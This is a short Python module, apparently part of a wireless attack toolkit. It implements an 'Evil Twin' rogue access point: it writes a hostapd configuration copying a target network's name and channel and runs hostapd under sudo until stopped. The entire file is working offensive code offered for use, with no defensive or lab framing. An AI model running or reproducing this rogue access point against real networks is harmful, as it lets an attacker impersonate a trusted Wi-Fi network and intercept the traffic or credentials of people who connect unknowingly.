"""Evil Twin module."""
import os
import subprocess
import time

class EvilTwin:
    def __init__(self, interface, output_dir):
        self.interface = interface
        self.output_dir = output_dir

    def launch(self, essid, channel):
        print(f"\n[*] Launching Evil Twin: {essid} on channel {channel}")
        conf = f"""
interface={self.interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
"""
        conf_path = "/tmp/hostapd_evil.conf"
        with open(conf_path, 'w') as f: f.write(conf)
        print("[*] Starting rogue AP...")
        proc = subprocess.Popen(["sudo", "hostapd", conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[*] Evil Twin running. Press Ctrl+C to stop.")
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            proc.terminate()
            print("\n[*] Evil Twin stopped.")
